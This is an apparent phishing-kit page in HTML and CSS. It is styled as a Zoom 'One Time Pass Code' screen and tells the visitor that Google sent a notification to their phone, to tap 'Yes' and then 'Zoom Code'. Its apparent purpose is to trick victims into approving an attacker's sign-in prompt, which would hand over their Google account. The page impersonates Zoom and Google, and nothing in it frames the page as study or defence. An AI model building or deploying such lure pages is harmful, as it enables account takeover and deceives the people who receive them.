<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
  >

  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;

      font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Roboto,
        Helvetica,
        Arial,
        sans-serif;
    }

    html,
    body {
      width: 100%;
      height: 100%;
      margin: 0;

      background: #ffffff;

      overflow: hidden;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* =====================================
       FULL PHONE SCREEN
       ===================================== */

    .container {
      width: 100%;
      max-width: 420px;

      height: 100dvh;

      background: #ffffff;

      display: flex;
      flex-direction: column;

      align-items: center;
      justify-content: center;

      text-align: center;

      padding:
        clamp(12px, 4dvh, 30px)
        clamp(14px, 5vw, 24px);

      overflow: hidden;
    }

    /* =====================================
       EVERYTHING STAYS TOGETHER
       ===================================== */

    .content-box {
      width: 100%;

      display: flex;
      flex-direction: column;

      align-items: center;

      justify-content: center;
    }

    /* =====================================
       LOGO
       ===================================== */

    .logo {
      width: clamp(45px, 14vw, 55px);

      height: auto;

      display: block;

      margin-bottom:
        clamp(12px, 3.5dvh, 28px);
    }

    /* =====================================
       TITLE
       ===================================== */

    h1 {
      width: 100%;

      font-size:
        clamp(18px, 5vw, 22px);

      line-height: 1.2;

      font-weight: 700;

      color: #111111;

      margin-bottom:
        clamp(14px, 3.5dvh, 28px);
    }

    /* =====================================
       PHONE
       ===================================== */

    .phone-illustration {
      width:
        min(53vw, 215px);

      height:
        min(24dvh, 215px);

      max-width: 215px;
      max-height: 215px;

      display: block;

      object-fit: contain;

      margin-bottom:
        clamp(10px, 2.5dvh, 22px);

      flex-shrink: 1;
    }

    /* =====================================
       HEADING
       ===================================== */

    h2 {
      width: 100%;

      font-size:
        clamp(16px, 4.5vw, 19px);

      line-height: 1.2;

      font-weight: 700;

      color: #111111;

      margin-bottom:
        clamp(5px, 1dvh, 8px);
    }

    /* =====================================
       DESCRIPTION
       ===================================== */

    .desc-text {
      width: 100%;

      font-size:
        clamp(12px, 3.6vw, 15px);

      line-height: 1.45;

      font-weight: 500;

      color: #1f2937;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* =====================================
       BUTTON
       ===================================== */

    .btn-join {
      width:
        min(100%, 320px);

      height:
        clamp(42px, 6dvh, 49px);

      margin-top:
        clamp(12px, 2.5dvh, 20px);

      background: #007aff;

      color: #ffffff;

      border: none;

      border-radius: 10px;

      font-size:
        clamp(13px, 3.8vw, 16px);

      font-weight: 700;

      cursor: pointer;

      box-shadow:
        0 4px 12px rgba(0, 122, 255, 0.25);

      flex-shrink: 0;

      transition:
        background-color 0.2s,
        transform 0.1s;
    }

    .btn-join:hover {
      background: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }

    /* =====================================
       iPHONE 12 / 13 / 14
       ===================================== */

    @media (min-width: 375px) and (min-height: 750px) {

      .logo {
        width: 54px;
      }

      h1 {
        font-size: 21px;
      }

      .phone-illustration {
        width: 205px;
        height: 195px;
      }

      h2 {
        font-size: 18px;
      }

      .desc-text {
        font-size: 14px;
      }

      .btn-join {
        width: 320px;
        max-width: 100%;
      }
    }

    /* =====================================
       SMALL PHONES
       ===================================== */

    @media (max-width: 360px) {

      .container {
        padding-left: 16px;
        padding-right: 16px;
      }

      .logo {
        width: 43px;
        margin-bottom: 14px;
      }

      h1 {
        font-size: 18px;
        margin-bottom: 14px;
      }

      .phone-illustration {
        width: 165px;
        height: 155px;
        margin-bottom: 10px;
      }

      h2 {
        font-size: 16px;
      }

      .desc-text {
        font-size: 12px;
        line-height: 1.35;
      }

      .btn-join {
        height: 42px;
        margin-top: 11px;
      }
    }

    /* =====================================
       SHORT SCREEN
       ===================================== */

    @media (max-height: 700px) {

      .container {
        padding-top: 10px;
        padding-bottom: 10px;
      }

      .logo {
        width: 42px;
        margin-bottom: 9px;
      }

      h1 {
        font-size: 18px;
        margin-bottom: 10px;
      }

      .phone-illustration {
        width: 165px;
        height: 150px;
        margin-bottom: 8px;
      }

      h2 {
        font-size: 16px;
        margin-bottom: 4px;
      }

      .desc-text {
        font-size: 12px;
        line-height: 1.3;
      }

      .btn-join {
        height: 42px;
        margin-top: 9px;
      }
    }

    /* =====================================
       VERY SHORT SCREEN
       ===================================== */

    @media (max-height: 600px) {

      .container {
        padding-top: 6px;
        padding-bottom: 6px;
      }

      .logo {
        width: 38px;
        margin-bottom: 6px;
      }

      h1 {
        font-size: 16px;
        margin-bottom: 7px;
      }

      .phone-illustration {
        width: 130px;
        height: 120px;
        margin-bottom: 6px;
      }

      h2 {
        font-size: 14px;
        margin-bottom: 3px;
      }

      .desc-text {
        font-size: 11px;
        line-height: 1.25;
      }

      .btn-join {
        height: 38px;
        margin-top: 6px;
      }
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="content-box">

      <!-- Zoom Logo -->
      <img
        class="logo"
        src="../../Zoom-Logo.png"
        alt="Zoom Logo"
      >

      <!-- Title -->
      <h1>
        One Time Pass Code
      </h1>

      <!-- Phone -->
      <img
        class="phone-illustration"
        src="../icon.gif"
        alt="Phone Illustration"
      >

      <!-- Heading -->
      <h2>
        Check your phone.
      </h2>

      <!-- Description -->
      <p class="desc-text">
        Google sent a notification to your phone.<br>
        <span>Tap Yes</span> on the notification<br>
        Then Tap Zoom Code
      </p>

      <!-- Resend -->
      <button
        class="btn-join"
        onclick="window.location.href='../'"
      >
        Resend
      </button>

    </div>

  </div>

</body>
</html>
